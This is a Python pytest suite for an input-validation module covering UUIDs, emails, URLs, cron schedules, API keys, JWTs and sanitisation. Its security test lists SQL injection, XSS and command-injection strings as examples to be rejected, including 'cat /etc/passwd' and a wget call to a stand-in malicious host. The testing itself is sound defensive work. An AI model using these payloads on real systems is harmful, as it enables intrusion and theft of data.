"""Tests for input validation utilities."""

import datetime
import uuid
from typing import Dict, Any

import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from pytest import raises

from airweave.utils.input_validation import (
    validate_uuid,
    validate_email,
    validate_url,
    validate_datetime,
    validate_cron_schedule,
    validate_string,
    validate_integer,
    validate_float,
    validate_boolean,
    validate_list,
    validate_dict,
    validate_api_key,
    validate_auth_code,
    validate_jwt,
    validate_security,
    sanitize_input,
    validate_and_sanitize_input,
    InputValidationError,
    SOURCE_CONNECTION_CREATE_VALIDATION,
    AUTH_CODE_VALIDATION,
)


class TestInputValidation:
    """Test suite for input validation utilities."""

    def test_validate_uuid(self):
        """Test UUID validation."""
        # Valid UUIDs
        validate_uuid(str(uuid.uuid4()), "test_field")
        validate_uuid("550e8400-e29b-41d4-a716-446655440000", "test_field")
        validate_uuid(uuid.uuid4(), "test_field")  # UUID object

        # Invalid UUIDs
        with raises(InputValidationError):
            validate_uuid("not-a-uuid", "test_field")
        with raises(InputValidationError):
            validate_uuid(123, "test_field")
        with raises(InputValidationError):
            validate_uuid("550e8400-e29b-41d4-a716", "test_field")

    def test_validate_email(self):
        """Test email validation."""
        # Valid emails
        validate_email("test@example.com", "test_field")
        validate_email("user.name+tag@example.co.uk", "test_field")

        # Invalid emails
        with raises(InputValidationError):
            validate_email("not_an_email", "test_field")
        with raises(InputValidationError):
            validate_email("test@", "test_field")
        with raises(InputValidationError):
            validate_email(123, "test_field")

    def test_validate_url(self):
        """Test URL validation."""
        # Valid URLs
        validate_url("https://example.com", "test_field")
        validate_url("http://example.com/path?query=value", "test_field")

        # Invalid URLs
        with raises(InputValidationError):
            validate_url("not_a_url", "test_field")
        with raises(InputValidationError):
            validate_url("ftp://example.com", "test_field")
        with raises(InputValidationError):
            validate_url(123, "test_field")

    def test_validate_datetime(self):
        """Test datetime validation."""
        # Valid datetimes
        validate_datetime(datetime.datetime.now(), "test_field")
        validate_datetime("2023-05-10T15:30:00Z", "test_field")
        validate_datetime("2023-05-10T15:30:00+00:00", "test_field")

        # Invalid datetimes
        with raises(InputValidationError):
            validate_datetime("not-a-date", "test_field")
        with raises(InputValidationError):
            validate_datetime("2023-05-10", "test_field")
        with raises(InputValidationError):
            validate_datetime(123, "test_field")

    def test_validate_cron_schedule(self):
        """Test cron schedule validation."""
        # Valid cron schedules
        validate_cron_schedule("* * * * *", "test_field")
        validate_cron_schedule("0 */6 * * *", "test_field")
        validate_cron_schedule("0 0 * * SUN", "test_field")

        # Invalid cron schedules
        with raises(InputValidationError):
            validate_cron_schedule("not-a-cron", "test_field")
        with raises(InputValidationError):
            validate_cron_schedule("* * * *", "test_field")  # Missing field
        with raises(InputValidationError):
            validate_cron_schedule(123, "test_field")

    def test_validate_string(self):
        """Test string validation."""
        # Basic validation
        validate_string("test", "test_field")

        # Length validation
        validate_string("test", "test_field", min_length=3, max_length=5)
        with raises(InputValidationError):
            validate_string("test", "test_field", min_length=5)
        with raises(InputValidationError):
            validate_string("test", "test_field", max_length=3)

        # Pattern validation
        validate_string("abc123", "test_field", pattern=r"^[a-z0-9]+$")
        with raises(InputValidationError):
            validate_string("ABC123", "test_field", pattern=r"^[a-z0-9]+$")

        # Type validation
        with raises(InputValidationError):
            validate_string(123, "test_field")

    def test_validate_integer(self):
        """Test integer validation."""
        # Valid integers
        validate_integer(123, "test_field")
        validate_integer("123", "test_field")  # String that can be converted
        validate_integer(-5, "test_field", min_value=-10)
        validate_integer(5, "test_field", max_value=10)

        # Invalid integers
        with raises(InputValidationError):
            validate_integer("not-a-number", "test_field")
        with raises(InputValidationError):
            validate_integer(3.14, "test_field")
        with raises(InputValidationError):
            validate_integer(5, "test_field", min_value=10)
        with raises(InputValidationError):
            validate_integer(15, "test_field", max_value=10)
        with raises(InputValidationError):
            validate_integer(True, "test_field")  # Boolean is not a valid integer

    def test_validate_float(self):
        """Test float validation."""
        # Valid floats
        validate_float(3.14, "test_field")
        validate_float("3.14", "test_field")  # String that can be converted
        validate_float(123, "test_field")  # Integers are valid floats
        validate_float(-5.5, "test_field", min_value=-10.0)
        validate_float(5.5, "test_field", max_value=10.0)

        # Invalid floats
        with raises(InputValidationError):
            validate_float("not-a-number", "test_field")
        with raises(InputValidationError):
            validate_float(5.5, "test_field", min_value=10.0)
        with raises(InputValidationError):
            validate_float(15.5, "test_field", max_value=10.0)
        with raises(InputValidationError):
            validate_float(True, "test_field")  # Boolean is not a valid float

    def test_validate_boolean(self):
        """Test boolean validation."""
        # Valid booleans
        validate_boolean(True, "test_field")
        validate_boolean(False, "test_field")
        validate_boolean("true", "test_field")  # String boolean
        validate_boolean("false", "test_field")  # String boolean

        # Invalid booleans
        with raises(InputValidationError):
            validate_boolean(1, "test_field")
        with raises(InputValidationError):
            validate_boolean(0, "test_field")
        with raises(InputValidationError):
            validate_boolean("yes", "test_field")
        with raises(InputValidationError):
            validate_boolean("no", "test_field")

    def test_validate_list(self):
        """Test list validation."""
        # Valid lists
        validate_list([1, 2, 3], "test_field")
        validate_list(["a", "b", "c"], "test_field", item_type="string")
        validate_list([1, 2, 3], "test_field", min_items=2, max_items=5)

        # Invalid lists
        with raises(InputValidationError):
            validate_list("not-a-list", "test_field")
        with raises(InputValidationError):
            validate_list([1, "b", 3], "test_field", item_type="integer")
        with raises(InputValidationError):
            validate_list([1, 2], "test_field", min_items=3)
        with raises(InputValidationError):
            validate_list([1, 2, 3], "test_field", max_items=2)

    def test_validate_dict(self):
        """Test dictionary validation."""
        # Valid dictionaries
        validate_dict({"a": 1, "b": 2}, "test_field")
        validate_dict({"a": "x", "b": "y"}, "test_field", value_type="string")
        validate_dict({"a": 1, "b": 2}, "test_field", key_type="string", value_type="integer")

        # Invalid dictionaries
        with raises(InputValidationError):
            validate_dict("not-a-dict", "test_field")
        with raises(InputValidationError):
            validate_dict({1: "a", 2: "b"}, "test_field", key_type="string")
        with raises(InputValidationError):
            validate_dict({"a": 1, "b": "c"}, "test_field", value_type="integer")

    def test_validate_api_key(self):
        """Test API key validation."""
        # Valid API keys
        validate_api_key("api_key_12345", "test_field")
        validate_api_key("API-KEY-12345", "test_field")
        validate_api_key("api.key.12345", "test_field")

        # Invalid API keys
        with raises(InputValidationError):
            validate_api_key("api!", "test_field")  # Invalid character
        with raises(InputValidationError):
            validate_api_key("api", "test_field")  # Too short
        with raises(InputValidationError):
            validate_api_key(12345, "test_field")  # Not a string

    def test_validate_auth_code(self):
        """Test auth code validation."""
        # Valid auth codes
        validate_auth_code("auth_code_12345", "test_field")
        validate_auth_code("AUTH-CODE-12345", "test_field")
        validate_auth_code("auth.code.12345", "test_field")

        # Invalid auth codes
        with raises(InputValidationError):
            validate_auth_code("auth!", "test_field")  # Invalid character
        with raises(InputValidationError):
            validate_auth_code(12345, "test_field")  # Not a string

    def test_validate_jwt(self):
        """Test JWT validation."""
        # Valid JWTs
        validate_jwt("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U", "test_field")
        validate_jwt("header.payload.signature", "test_field")

        # Invalid JWTs
        with raises(InputValidationError):
            validate_jwt("not-a-jwt", "test_field")
        with raises(InputValidationError):
            validate_jwt("header.payload", "test_field")  # Missing signature
        with raises(InputValidationError):
            validate_jwt(12345, "test_field")  # Not a string

    def test_validate_security(self):
        """Test security validation."""
        # Benign inputs should pass
        validate_security("normal input", "test_field")
        validate_security("user@example.com", "test_field")

        # Detect SQL injection attempts
        with raises(InputValidationError):
            validate_security("'; DROP TABLE users; --", "test_field")
        with raises(InputValidationError):
            validate_security("SELECT * FROM users WHERE name = 'John'", "test_field")
        with raises(InputValidationError):
            validate_security("UNION SELECT username, password FROM users", "test_field")

        # Detect XSS attempts
        with raises(InputValidationError):
            validate_security("<script>alert('XSS')</script>", "test_field")
        with raises(InputValidationError):
            validate_security("javascript:alert('XSS')", "test_field")
        with raises(InputValidationError):
            validate_security("<img src=x onerror=alert('XSS')>", "test_field")

        # Detect command injection attempts
        with raises(InputValidationError):
            validate_security("user; cat /etc/passwd", "test_field")
        with raises(InputValidationError):
            validate_security("user && wget malicious.com/payload", "test_field")

    def test_sanitize_input(self):
        """Test input sanitization."""
        # String sanitization
        assert sanitize_input(" test ", "string", "strip") == "test"
        assert sanitize_input("TEST", "string", "lowercase") == "test"
        assert sanitize_input("test", "string", "uppercase") == "TEST"
        assert sanitize_input("test", "string", "title") == "Test"
        assert sanitize_input("  multiple   spaces  ", "string", "trim_whitespace") == "multiple spaces"
        assert sanitize_input("", "string", "none_if_empty") is None
        assert sanitize_input("  ", "string", "none_if_empty") is None

        # No sanitization for other types
        assert sanitize_input(123, "integer", "strip") == 123
        assert sanitize_input([1, 2, 3], "list", "lowercase") == [1, 2, 3]

    def test_validate_and_sanitize_input(self):
        """Test the comprehensive validation and sanitization function."""
        # Valid input
        input_data = {
            "name": " Test Connection ",
            "short_name": "test_conn",
            "description": "  This is a test connection  ",
            "sync_immediately": True,
            "cron_schedule": "0 */6 * * *"
        }

        sanitized, errors = validate_and_sanitize_input(
            input_data, SOURCE_CONNECTION_CREATE_VALIDATION, raise_exception=False
        )

        assert len(errors) == 0
        assert sanitized["name"] == "Test Connection"
        assert sanitized["description"] == "This is a test connection"
        assert sanitized["short_name"] == "test_conn"
        assert sanitized["sync_immediately"] is True
        assert sanitized["cron_schedule"] == "0 */6 * * *"

        # Invalid input should generate errors
        bad_input = {
            "name": "Te",  # Too short
            "short_name": "Test-Conn",  # Invalid pattern
            "cron_schedule": "invalid-cron",
            "sync_immediately": "yes"  # Not a boolean
        }

        _, errors = validate_and_sanitize_input(
            bad_input, SOURCE_CONNECTION_CREATE_VALIDATION, raise_exception=False
        )

        assert len(errors) == 4
        error_fields = [error["field"] for error in errors]
        assert "name" in error_fields
        assert "short_name" in error_fields
        assert "cron_schedule" in error_fields
        assert "sync_immediately" in error_fields

        # Test exception raising
        with raises(HTTPException) as exc_info:
            validate_and_sanitize_input(bad_input, SOURCE_CONNECTION_CREATE_VALIDATION, raise_exception=True)

        assert exc_info.value.status_code == 422
        assert "errors" in exc_info.value.detail

    def test_predefined_validation_rules(self):
        """Test that predefined validation rules are correctly defined."""
        # SOURCE_CONNECTION_CREATE_VALIDATION
        assert "name" in SOURCE_CONNECTION_CREATE_VALIDATION
        assert SOURCE_CONNECTION_CREATE_VALIDATION["name"]["required"] is True
        assert "short_name" in SOURCE_CONNECTION_CREATE_VALIDATION
        assert "collection" in SOURCE_CONNECTION_CREATE_VALIDATION

        # AUTH_CODE_VALIDATION
        assert "code" in AUTH_CODE_VALIDATION
        assert AUTH_CODE_VALIDATION["code"]["required"] is True
        assert AUTH_CODE_VALIDATION["code"]["security_check"] is True
        assert "client_id" in AUTH_CODE_VALIDATION
        assert "client_secret" in AUTH_CODE_VALIDATION